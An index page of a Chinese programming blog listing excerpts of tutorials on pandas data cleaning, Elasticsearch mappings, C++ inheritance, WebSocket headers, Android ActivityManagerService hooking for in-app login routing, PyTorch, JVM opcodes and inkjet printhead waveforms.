<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/da9b89722b4d2501aed90a9d84c71650/" rel="bookmark">
			数据分析02——数据清洗及特征处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据分析02——数据清洗及特征处理 查看数据 .info() 打印 DataFrame 的简要摘要，显示有关 DataFrame的信息，包括索引的数据类型dtype和列的数据类型dtype，非空值的数量和内存使用情况。 df.info .isnull() df.isnull()来判断缺失值df.isnull().sum()统计缺失值个数 显示所需列的数据信息 df[['Age','Cabin','Embarked']] 缺失值处理——dropna函数与fillna函数 .dropna() .dropna(axis=0, how='any', thresh=None, subset=None, inplace=False)[source] 默认滤除所有包含NaN传入how=‘all’滤除全为NaN的行，传入axis=1滤除列传入thresh=n保留至少有n个非NaN数据的行 df[df['Age']==None]=0 df[df['Age'].isnull()] = 0 df[df['Age'] == np.nan] = 0 df.dropna() # 把缺失值替换为0 .fillna() DataFrame.fillna(value=None, method=None, axis=None, inplace=False, limit=None, downcast=None) df.fillna(0) # 把缺失值替换为0 参数
value ：用来填充缺失值的值
inplace参数的取值：True、False
True：直接修改原对象
False：创建一个副本，修改副本，原对象不变（缺省默认）
method参数的取值：
{‘backfill’, ‘bfill’, ‘pad’, ‘ffill’, None}, default None
method = ‘ffill’/‘pad’：用前一个非缺失值去填充该缺失值;
method = ‘bfill’/‘backfill’：用下一个非缺失值填充该缺失值;
axis参数的取值：
{0 or ‘index’, 1 or ‘columns’}
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/da9b89722b4d2501aed90a9d84c71650/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c2480d7111c5d1e308a634f4e3e5962/" rel="bookmark">
			ElasticSearch学习（二）： Mapping的数据类型和参数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、什么是Mapping Mapping 类似于数据库中的表结构定义schema，它的主要作用是：用来定义索引中的字段的名称、定义字段的数据类型、定义字段类型的一些其它参数，比如字符串、数字、布尔字段，倒排索引的相关配置，设置某个字段为不被索引、记录 position 等。每一种数据类型都有对应的使用场景，并且每个文档都有映射，但是在大多数使用场景中，我们并不需要显示的创建映射，因为ES中实现了动态映射。我们在索引中写入一个下面的JSON文档：
{ "name":"jack", "age":18, "birthDate": "1991-10-05" } 在动态映射的作用下，name会映射成text类型，age会映射成long类型，birthDate会被映射为date类型，映射的索引信息如下。
{ "mappings": { "_doc": { "properties": { "age": { "type": "long" }, "birthDate": { "type": "date" }, "name": { "type": "text", "fields": { "keyword": { "type": "keyword", "ignore_above": 256 } } } } } } } 2、Mapping的数据类型 ES 字段类型类似于 MySQL 中的字段类型，ES 字段类型主要有：核心类型、复杂类型、地理类型、特殊类型，常见的ELasticSearch数据类型如下：
一级分类二级分类具体类型核心类型字符串类型string，text，keyword整数类型integer，long，short，byte浮点类型double，float，half_float，scaled_float逻辑类型boolean日期类型date范围类型range(Integer_range，long_range，date_range...)二进制类型binary (BASE64 的二进制)复合类型数组类型array对象类型object嵌套类型nested地理类型地理坐标类型geo_point地理地图geo_shape特殊类型IP类型ip......... 下面简单介绍一下常用的类型
2.1、字符串类型 从ElasticSearch 5.x开始不再支持string，由text和keyword类型替代：
【text 类型】：
适用于需要被全文检索的字段，因为它会分词，例如新闻正文、邮件内容等比较长的文字，text 类型会被 Lucene 分词器（Analyzer）处理为一个个词项，并使用 Lucene 倒排索引存储，text 字段不能被用于排序。如果需要使用该类型的字段只需要在定义映射时指定 JSON 中对应字段的 type 为 text。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5c2480d7111c5d1e308a634f4e3e5962/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5737f66c5108d1abdb5e633b775d52de/" rel="bookmark">
			C&#43;&#43; —— 继承
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 继承的定义1.1 继承的定义格式1.2 继承的方式 2. 基类和派生类的赋值转换2.1 赋值转换的使用2.2 赋值转换的原理 3. 构成隐藏，重写3.1 隐藏的使用3.2 重写的使用条件 4. 默认成员函数的继承关系4.1 子类需要写默认成员函数的情况4.2 如何写默认成员函数 5. 继承的友元函数6. 继承的静态成员7. 菱形继承7.1 继承的方式7.2 菱形继承的问题 8. 继承和组合 前言： C++继承是很重要的，笔试面试都会常考。复用是C++中常用的，继承就是类层次上的复用。基类，派生类。派生类继承了基类，然后再进行扩展。这个过程承呈现了面向对象程序设计的层次结构，体现了由简单到复杂的认知过程。本文详细的剖析继承，灰常细节。 1. 继承的定义 1.1 继承的定义格式 简单的举一个例子：
学生的信息包括：姓名 ，年龄，学号 ；老师的信息包括：姓名，年龄，工号； 发现两者有共同的部分：姓名，年龄
所以我们可以定义一个基类包含姓名，年龄；使得学生类和教师类都继承此基类。
#include&lt;iostream&gt; #include&lt;string&gt; using namespace std; //基类 class person { public : person(const char *name="zhangsan", int age = 0) :_name(name), _age(age) { } string _name; int _age; }; // 派生类 class student :public person { public: student(const char* name="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5737f66c5108d1abdb5e633b775d52de/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7f75b5bd681810ded737f9ac9b0309b5/" rel="bookmark">
			JS函数（function）的定义和使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		函数是一组执行特定任务（具有特定功能）的，可以重复使用的代码块，前面几节中用到的 alert()、write() 就是 JavaScript 中内置的函数。
除了使用内置函数外，我们也可以自行创建函数（自定义函数），然后在需要的地方调用这个函数，这样不仅可以避免编写重复的代码，还有利于代码的后期维护。本节我们主要来介绍一下如何使用 JavaScript 编写一个自己的函数。
JS 定义函数 JS 函数声明需要以 function 关键字开头，之后为要创建的函数名称，function 关键字与函数名称之间使用空格分开，函数名之后为一个括号( )，括号中用来定义函数中要使用的参数（多个参数之间使用逗号,分隔开），一个函数最多可以有 255 个参数，最后为一个花括号{ }，花括号中用来定义函数的函数体（即实现函数的代码），如下所示：
function functionName(parameter_list) { // 函数中的代码 } 当调用该函数时，会执行函数内的代码。
可以在某事件发生时直接调用函数（比如当用户点击按钮时），并且可由 JavaScript 在任何位置进行调用。
注意:JavaScript 对大小写敏感。关键词 function 必须是小写的，并且必须以与函数名称相同的大小写来调用函数。
调用带参数的函数 在调用函数时，您可以向其传递值，这些值被称为参数。
这些参数可以在函数中使用。
您可以发送任意多的参数，由逗号 (,) 分隔：
myFunction(argument1,argument2) 当声明函数时，把参数作为变量来声明：
function myFunction(var1,var2) { 代码 } 带有返回值的函数 有时，我们会希望函数将值返回调用它的地方。
通过使用 return 语句就可以实现。
在使用 return 语句时，函数会停止执行，并返回指定的值。
语法 function myFunction() { var x=5; return x; } 上面的函数会返回值 5。
注意： 整个 JavaScript 并不会停止执行，仅仅是函数。JavaScript 将继续执行代码，从调用函数的地方。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7f75b5bd681810ded737f9ac9b0309b5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/899faf7e25c7a2e0445239d0f7b0366f/" rel="bookmark">
			websocket如何携带header或参数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一 websocket如何携带参数
相信用过websocket的同学都知道，直接在url后面拼接参数即可。不多做阐述。
var ws = new WebSocket("ws://url?userid=1"); 二 websocket如何携带header
最近项目组接到新需求，需要websocket连接时，在header里面传递token，由于token较长，不适合在url中直接拼接。
网上查阅了相关的资料，websocket没有像http那样可以只定义请求头的一些参数，只有一个Sec-WebSocket-Protocol属性用于自定义子协议。
意思就是说可以将token当做一个参数传递给后端，只不过参数的封装形式是以Sec-WebSocket-Protocol为key的一个header属性值。
后台接收到websocket连接后，可以通过下述代码获取到token值。
request.getHeader("Sec-WebSocket-Protocol") 需要注意的是，如果前端通过websocket连接时指定了Sec-WebSocket-Protocol，后端接收到连接后，必须原封不动的将Sec-WebSocket-Protocol头信息返回给前端，否则连接会抛出异常。
--------------------------------------------------------------------------
前端代码格式
var aWebSocket = new WebSocket(url，[protocols]); url
要连接的URL；WebSocket服务器响应的URL。
protocols 可选
一个协议字符串或者一个包含协议字符串的数组。这些字符串用于指定子协议，这样单个服务器可以实现多个WebSocket子协议（例如，您可能希望一台服务器能够根据指定的协议（protocol）处理不同类型的交互）。如果不指定协议字符串，则假定为空字符串。
--------------------------------------------------------------------------
介绍就到这里，直接上前后端完整代码示例，方便后来者学习。
前端
var webSocket = new WebSocket(url，[token]); 后端
&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-websocket&lt;/artifactId&gt; &lt;/dependency&gt; package com.xx; import org.apache.commons.lang3.StringUtils; import org.slf4j.Logger; import org.slf4j.LoggerFactory; import org.springframework.http.HttpStatus; import org.springframework.http.server.ServerHttpRequest; import org.springframework.http.server.ServerHttpResponse; import org.springframework.http.server.ServletServerHttpRequest; import org.springframework.http.server.ServletServerHttpResponse; import org.springframework.stereotype.Component; import org.springframework.web.socket.WebSocketHandler; import org.springframework.web.socket.server.HandshakeInterceptor; import org.springframework.web.socket.server.support.HttpSessionHandshakeInterceptor; import javax.annotation.Resource; import javax.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/899faf7e25c7a2e0445239d0f7b0366f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7b69f8c477d4c04ad478f8d9b86a8cc7/" rel="bookmark">
			Android Framework实战：AMS HOOK实现集中登陆
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、目的 项目代码
实现需要登陆场景判断的任何页面做到没有代码插入。
例如下面，当我们启动一个页面需要判断它有没有登陆，一般会做如下判断：
if (!isLogin) { //未登录 val intent = Intent(this, LoginActivity::class.java) startActivity(intent) return } val intent = Intent(this, SecondActivity::class.java) startActivity(intent) 但是如果你通过hook AMS，就可以做到以下面代码实现自动跳转登陆页。 val intent = Intent(this, SecondActivity::class.java) startActivity(intent) 二、实现逻辑 实现的逻辑难点在于要去适配每一个版本的AMS代码，因为我们都是通过反射去hook Activity的启动逻辑。
既然要适配每一个版本的代码，那就需要我们对Activity的启动流程有一定的了解。
不了解AMS源码的可以看这一篇
如果了解了Activity的启动流程，那么肯定知道下面几个步骤：
Activity的启动是通过ActivityManagerService来启动的ActivityManagerService通过发送消息给ActivityThread来启动ActivityActivityThread负责创建和调用Activity的生命周期 有了上面的了解后，这个AMS HOOK集中登陆技术大概可以总结为以下三个流程：
第一步：通过反射获取到ActivityManagerService，通过动态代理去监听startActivity的事件
第二步：在ActivityManagerService的startActivity的事件中，我们需要替换成一个真实的Activity。
第三步：最后，监听ActivityThread的mH，获取创建Activity的命令。
下面，我们通过代码，看下是如何实现上面三步的。
提示：下面的代码基于安卓源码6.0
第一步： 获取ActivityManagerService public void hookAmsFor6() throws Exception { //1.反射获取类&gt;ActivityManagerNative Class ActivityManagerClz = Class.forName("android.app.ActivityManagerNative"); //2.获取变量&gt;gDefault Field IActivityManagerSingletonFiled = ActivityManagerClz. getDeclaredField("gDefault"); //2.1 设置访问权限 IActivityManagerSingletonFiled.setAccessible(true); //3. 获取变量的实例值 Object IActivityManagerSingletonObj = IActivityManagerSingletonFiled.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7b69f8c477d4c04ad478f8d9b86a8cc7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a60ed3aeab262c696e35fea8b8c89aa5/" rel="bookmark">
			ipa上架App Store流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1）提交ipa工具：Transporter(Mac版) 苹果提供 Transporter 来处理大量和差异化数据的操作的工具（可以在 macOS、Windows 和 Linux 操作系统上安装和运行 Transporter。）：
Transporter 是 Apple 基于 Java 的命令行工具，用于进行大量目录交付。您可以使用 Transporter 将预生成的内容以 Store 数据包的形式交付至 iTunes Store、Apple Books 和 App Store。
不论您使用 iTunes Connect 帐户（图书发行商或音乐提供商）、App Store Connect 帐户（App 开发者）或是编码工作室帐户来交付图书、视频、音乐或 App 内容，您都可以使用 Transporter 以确保您的元数据和素材（例如音频、视频、图书和 App 文件）适当地交付至 iTunes Store、Apple Books 或 App Store，并根据 Apple 的规范验证 Store 数据包。
2）查看APP 登录苹果开发者官网，进入App Store Connect界面，点击我的APP。
3）创建APP 界面中会显示你之前创建过的APP，如果没有创建过，也可以点击创建新建APP按钮，并填写相关创建信息。
4）构建版本 进入app信息界面，找到构建版本模块点击查看上传工具，进入查看界面，里面介绍了Xcode、altool、Transporter App三种上传ipa的方法，开发人员可以根据需求选择合适的上传方式。
5）Transporter App上传ipa 添加你要上传的ipa文件，在“…”按钮中选择验证，验证通过后点击交付，如验证未通过或者交付未成功，根据提示进行修改之后重新交付，提示交付成功后，等待几分钟，回到App Store connect界面，构建版本模块中选择你刚刚上传上来的文件。
6）填写其他相关信息 根据要求填写其他相关信息即可，可参考下方链接进行填写：
iOS app上架app store流程详解_hepingdev的博客-CSDN博客_ios上传app store
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a60ed3aeab262c696e35fea8b8c89aa5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b22461da4c4f84b0b4e210946e97099/" rel="bookmark">
			U-Net Transformer：用于医学图像分割的自我和交叉注意力模块
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Abstract-摘要 对于复杂和低对比度的解剖结构，医学图像分割仍然特别具有挑战性。本文提出的一种U-Transformer网络，它将Transformer中的self-attention和Cross attention融合进了UNet，这样克服了UNet无法建模长程关系和空间依赖的缺点，从而提升对关键上下文的分割。本文集合了两种注意力机制：自注意力机制建立编码器之间的全局交互，交叉注意力被添加到跳跃连接当中。通过过滤非语义特征在UNet Decoder中恢复空间信息。
Introduction 尽管FCN，Unet系列都取得了不错的性能，但是仍然具有局限性，这种网络结构处理有局部二义性或者低对比度器官时表现不佳。
本文提出的U-Transformer，借助Transformer的特性来帮助建模长程依赖关系和空间依赖关系，U-Transformer保留了原始的U型架构提取归纳偏置，此外引入了两种注意力机制来改善网络的决策能力。
首先。self-attention在编码器的结尾用来显式的建模语义之间的全局交互关系，其次在跳跃连接中加入了Cross attention从而过滤到非语义特征，从而更好的协助U-Net恢复空间信息。
The U-Transformer结构 U型网络的编码器结构可以有效的提取全局上下文信息进行复杂的医学图像分割任务，本文的U-Transformer将多头Transformer中的模块引入UNet，通过两种注意力机制（多头自注意力和多头交叉注意力）来提取长程关系和空间依赖性。其网络结构如下图：
如图所示，多头注意力机制（MHSA）加在编码器最后，其感受野是整张图像1，而原始的UNet的感受野只是局部（蓝色区域），多头交叉注意机制用在解码器中的跳跃连接之后，主要将高层次语义更丰富的特征图谱与来自跳跃连接的高分辨率图结合起来。
Part-1自注意力机制 多头自注意力模块用于提取图像中的长程结构信息，因此本文在UNet做完编码器部分后在底部加入了多头注意力机制，这个多头注意力机制的主要作用是将特征图中的每个元素建立关联，对应的感受野是整个图像，因此当前像素点的分类取决于所有输入的像素，注意力的计算公式如下：
自注意力机制的计算涉及到了Q,K,V三个矩阵
MHSA模块 MHSA模块的具体计算过程如下图：
首先特征图+位置编码后reshape到一定的维度，Wq，Wk，Wv是训练的3个矩阵，通过这三个矩阵得到自注意力模块的计算结果，而Positional embedding对于医学图像分割十分重要，因为不同的组织结构分别在图像中不同的固定位置，加入Position信息之后就可以捕获器官之间的绝对信息和相对信息。
Q,K经过Softmax后的结果为注意力系数矩阵A，A乘以V得到最后的注意力输出。
MHCA模块 交叉注意力负责将输入图像的每个像素之间建立关联，MHCA的核心思想就是想办法滤除跳跃连接中无关或噪声区域，突出显示相关区域。
其结构如下图所示：
MHCA的作用类似于一个门控函数，输入分别是跳跃连接过来的结果S和上一层的特征图Y处理后的结果。Y嵌入后的结果作为Q,K，S输入的结果作为V，最后跳跃连接的输出S是经过Y加权处理后的结果，计算出来的注意力权重会被rescale到0-1之间，最终交叉注意力的计算结果Z作为一个Fliter，再与S做点积，其中权值较小的元素代表噪声或者不相关的区域，可以被去除。经过这样处理的精简版的S，再将这一精简版的结果S再与Y做级联。
总结 本文提出的U-Transformer借助Transformer中的自注意力和交叉注意力有效的增加了UNet的性能，可以有效的捕获长程依赖关系，尤其对复杂器官或较小器官具有很好的分割性能。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7087b7ef792e247f253e69f43e566537/" rel="bookmark">
			【解决】pytorch单机多卡问题：ERROR: torch.distributed.elastic.multiprocessing.api:failed
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近在使用单机多卡进行分布式（DDP）训练时遇到一个错误：ERROR: torch.distributed.elastic.multiprocessing.api:failed。
而实际报错的内容是：ValueError: sampler option is mutually exclusive with shuffle.
报错的详细内容如下截图所士：
出现这种错误的原因是，在分布式训练时使用了sampler，并且dataloader时参数shuffle设置成True。由于sampler在分配数据给gpu时已经自动打乱了数据，所以dataloader无需重复打乱数据，二者是相冲的。
因此，使用分布式训练时，会使用sampler，在dataloader时参数shuffle默认False即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f77fdb2431ac8333a9da5b6de4596eb2/" rel="bookmark">
			接口自动化测试用例层对接口参数的传递(二)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		​
接口自动化测试中，往往测试的接口参数可能较多且测试场景复杂，比如测试参数必填、参数值非法，用例层如果直接定义接口的参数，存在大量重用数据且如果接口发生变更（删除一个参数、修改一个参数名）需要在用例层修改很多地方
为解决这个问题，肯定是要将接口定义和用例层分离处理。
具体思路如下：
1.按模块**将接口定义在对应的yaml文件中，参数使用${parmaname}表示**（方便使用string.safe_substitute()方法进行参数的替换） *substitute的解释可以查看这篇文章《python-字符串的模板替换》* 2.在baseapi这个父类的__init__方法中读取接口yaml的内容 3.业务api类继承baseapi，在具体接口方法中根据关键字拿到接口定义，根据case层传过来的参数做参数替换，替换后的内容去调用requestUtil中封装的接口处理方法 4.requestUtil的接口处理方法将接口参数没有被替换的${param}进行删除，返回给业务api 5.业务api调用requestsUtil封装的api方法，去发起请求 get接口按这个思路实现很简单，但是post、put接口因为其请求body体是json接口，处理起来稍微复杂一些
样例代码如下：
首先从简单的get接口开始：GET /v1/domains/ d o m a i n i d / p o l i c y 这个接口只有一个路径参数 {domain_id}/policy 这个接口只有一个路径参数 domaini​d/policy这个接口只有一个路径参数{domain_id}需要替换，headers中有一个$authtoken需要替换。
在yaml中这样定义接口： show_domain_policy: method: get url: /v1/domains/${domain_id}/policy headers: Content-Type: application/json;charset=utf8 authToken: $authtoken 2.在baseapi的init中定义从yaml文件中读取该业务api对应文件的所有api定义，会赋值到self.apiconfig变量
class BaseApi(): __envdir = DIR_NAME + "/conf/env.yml" env = yamlUtil(__envdir).readyaml() def __init__(self,serviceyaml): self.baseurl = self.env['protocl']+'://'+self.env['envConfig'][self.env['default']] ##从env文件读取参数拼接调用域名 apidir = os.path.abspath(os.path.realpath(__file__) + os.path.sep +'../')+'/apiyaml/'+serviceyaml self.apiconfig =yamlUtil(apidir).readyaml() self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f77fdb2431ac8333a9da5b6de4596eb2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/db123a6ebb47f20e34174eea9463beac/" rel="bookmark">
			JVM指令手册
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、栈和局部变量操作 生成常量压入栈的指令 aconst_null 将null对象引用压入栈
iconst_m1 将int类型常量-1压入栈
iconst_0 将int类型常量0压入栈
iconst_1 将int类型常量1压入栈
iconst_2 将int类型常量2压入栈
iconst_3 将int类型常量3压入栈
iconst_4 将int类型常量4压入栈
iconst_5 将int类型常量5压入栈
lconst_0 将long类型常量0压入栈
lconst_1 将long类型常量1压入栈
fconst_0 将float类型常量0压入栈
fconst_1 将float类型常量1压入栈
dconst_0 将double类型常量0压入栈
dconst_1 将double类型常量1压入栈
bipush 将一个8位带符号整数压入栈
sipush 将16位带符号整数压入栈
ldc 把常量池中的项压入栈
ldc_w 把常量池中的项压入栈（使用宽索引）
ldc2_w 把常量池中long类型或者double类型的项压入栈（使用宽索引）
从局部变量中把值压入栈的指令 iload 从局部变量中装载int类型值压入栈
lload 从局部变量中装载long类型值压入栈
fload 从局部变量中装载float类型值压入栈
dload 从局部变量中装载double类型值压入栈
aload 从局部变量中装载引用类型值（refernce）压入栈
iload_0 从局部变量0中装载int类型值压入栈
iload_1 从局部变量1中装载int类型值压入栈
iload_2 从局部变量2中装载int类型值压入栈
iload_3 从局部变量3中装载int类型值压入栈
lload_0 从局部变量0中装载long类型值压入栈
lload_1 从局部变量1中装载long类型值压入栈
lload_2 从局部变量2中装载long类型值压入栈
lload_3 从局部变量3中装载long类型值压入栈
fload_0 从局部变量0中装载float类型值压入栈
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/db123a6ebb47f20e34174eea9463beac/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c6dcb857fab5fbcd253ac639d94c146/" rel="bookmark">
			文件打印（一）HTML文件打印
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近用到了打印HTML文件，特地记录一下。
HTML文件打印 1、设置默认打印机2、单个文件打印3、打印多个文件3、顺序打印 打印HTML页面的话，我使用WebBrowser控件。 1、设置默认打印机 /// &lt;summary&gt; /// 页面加载 /// &lt;/summary&gt; /// &lt;param name="sender"&gt;&lt;/param&gt; /// &lt;param name="e"&gt;&lt;/param&gt; private void Form1_Load(object sender, EventArgs e) { #region 绑定打印机信息 PrintDocument fPrintDocument = new PrintDocument(); //获取默认打印机 string defaultPrinter = fPrintDocument.PrinterSettings.PrinterName; //打印机绑定 List&lt;string&gt; printerList = new List&lt;string&gt;(); var printList = PrinterSettings.InstalledPrinters; foreach (String fPrinterName in printList) { printerList.Add(fPrinterName); } this.cbx_devs.DataSource = printerList; this.cbx_devs.SelectedItem = defaultPrinter; #endregion } /// &lt;summary&gt; /// 值改变事件-设置默认打印机 /// &lt;/summary&gt; /// &lt;param name="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0c6dcb857fab5fbcd253ac639d94c146/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/018820a79f434d8e6a0ac093931fb42f/" rel="bookmark">
			【行业基础】什么是波形
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		00. 目录 文章目录 00. 目录01. 概述02. 基础03. 脉冲时序04. 共振现象05. 多个脉冲06. 附录 01. 概述 想更多地了解什么是波形，它们如何工作，以及为什么它们是喷墨开发中必不可少的一部分？很好，因为它们很重要，而且通常不是很了解。在这篇文章中，我们将讨论波形的基础知识，而在下一篇文章中，您将找到实践步骤，以逐步优化油墨的波形。
02. 基础 为了帮助解释波形的目的，让我们看一下打印头的喷嘴腔内部。下图描述了称为填充和喷射的喷射过程，该过程非常普遍地应用于设计不同的许多不同的喷头。在这种情况下，每当对PZT（压电陶瓷材料）施加电压时，其堆叠都会变形，从而改变墨水腔的容积，并使墨水在其中移动并最终喷射。将此电压施加到PZT的方法是波形。
在我们的示例中，PZT仅在施加电压时才伸展，因此在插入喷头之前不会变形。一旦通电，喷头便会保持特定的电压，从而导致PZT伸展并保持其非喷射位置（左）。如果电压降低，则PZT会缩回并在腔室内产生膨胀，从而将墨水吸入其中（中）。要喷射墨滴，电压恢复到其原始值，墨水盒收缩，并挤出多余的墨水（右）。此过程每秒重复数千次。
需要注意的是，打印头可以由正向脉冲或反向脉冲驱动，这取决于不同公司的技术考量。不管基于何种设计，波形中最重要的是波形倾斜部分的计时与保持计时。即电压保持在那个水平(高或低)多久后才回到起始位置。脉冲计时决定了当腔体的体积恢复到稳定状态时喷嘴处的喷墨状态，这是构建波形的第一步。
03. 脉冲时序 如果打印时你站在打印头旁边，你甚至可能会听到它“唱歌”，这取决于打印使用的频率。你能听到它的原因是因为驱动器产生声波。当然，这里面最重要的是墨水本身产生的声波，因为喷射压力的变化是由其来定义的。
由于存在具有某些机械性能的墨水，并且由于声波反弹时会损失能量，因此腔室内的压力可以描述为阻尼共振器。压力的任何变化（例如PZT变形）都会导致特征压力变化。如此处所示，当PZT缩回并且腔室体积增大时，压力变化将导致墨水在腔室内开始来回移动。
通常，仅靠这种能量不足以使墨水喷射，只是将其拉回到腔室的另一端并弹起。通过在适当的时间使用电压脉冲增强压力，可以使液滴喷射更加有效，如此处所示。由于最佳时机，当压力超过临界值时会喷出液滴。
脉冲宽度如此关键的原因是，如果脉冲宽度太短或太长，则PZT的波动，压力和运动将不同步。如果在添加更多压力时墨水没有朝正确的方向移动，而不是平稳地增加动量，则可能会抵消动量。这类似于将孩子推到秋千上。如果在正确的时间推动它们，则动量会增加，并且它们会摆动得更高。如果在错误的时间推动它们，它们将猛烈停止。同样，如果脉冲宽度不正确，则反复进行的结果喷射将效率低下且不稳定。
因为墨水需要在腔室的整个长度上来回移动，所以打印头可以产生的最大频率取决于打印头腔室的大小。设计有较长腔室的打印头需要更多的时间来使声波来回传播，因此无法经常喷射墨滴。
由于喷嘴室的长度是固定的，因此您可能会认为，对于给定的打印头，正确计时压力波所需的脉冲宽度是恒定的。但是，时间也会受到该特定墨水的声音速度的影响。这就是为什么必须针对特定的墨水和打印头组合调整波形的原因，仅具有该打印头的通用波形是不够的。幸运的是，如果墨水的特性相似，则相同的波形对两者都适用。
04. 共振现象 通常，在一个频率下工作的波形可能在另一个频率下工作的频率不佳。当墨水在腔室内来回移动时，这全部归结为脉冲的定时。随着打印频率的增加，给定脉冲产生的波和运动可以开始与前一个脉冲相互作用。在某些频率下，这将是增强的，结果是共振，如图像中的顶部示例所示。
打印频率越高，在下一个降落和压力波来临时，压力尚未衰减到零的可能性就越大，因此，产生不良发射的可能性越大。如果墨水仍在移动，则前一个脉冲可能会增加压力（速度更高，更多的人造卫星，润湿）或降低压力（速度更低）。如果您的打印速度灵活，那么在一定频率范围内研究液滴的形成是明智的，以确保最终打印速度不会落在发生共振的频率范围内。
05. 多个脉冲 如果电子设备允许，则可以在每个像素处使用多个脉冲，从而使您可以创建更大，更快的墨滴。用于多脉冲的波形通常取决于压力波中的第一或第二共振。这意味着当墨水向喷嘴移动时，第一个脉冲将增加墨水的压力。一些墨水会喷出，其余的墨水会从孔口反弹并返回到对面的壁。一旦墨水再次移向喷嘴，第二个脉冲将增加其动量。脉冲应仔细调整。增强材料可能非常坚固，使压力过分驱动并造成喷嘴润湿。
如果脉冲的振幅相同，则第二个液滴将比第一个液滴更大且更快，因为它建立在前一个脉冲的共振上。它可以合并在面板或飞行中，具体取决于几个因素，包括打印头设计，脉冲到脉冲的时间，使用的电压和墨水性质。
实时查看液滴形成的能力有助于理解这些影响。在下面用JetXpert dropwatcher拍摄的照片中，您可以看到在相邻喷嘴中通过共振多脉冲波形形成了不同大小的液滴。左侧的喷嘴施加了三个脉冲波形，中央喷嘴只有最后两个脉冲，而右侧喷嘴只有最后一个脉冲。用于产生液滴的三个脉冲在时间上均匀分布，并且每个图像都是在压力波击中喷嘴开口时拍摄的。
请注意，在脉冲结束后，喷嘴弯月面的延伸是由压力波引起的。第一个发生在韧带分离之前。喷射两次或更多次的喷嘴上的弯月面凸起较大，这表明由于先前的脉冲，已经施加了额外的压力。通过调整脉冲时序并可视化进度，可以更快地改善特定墨水的波形。
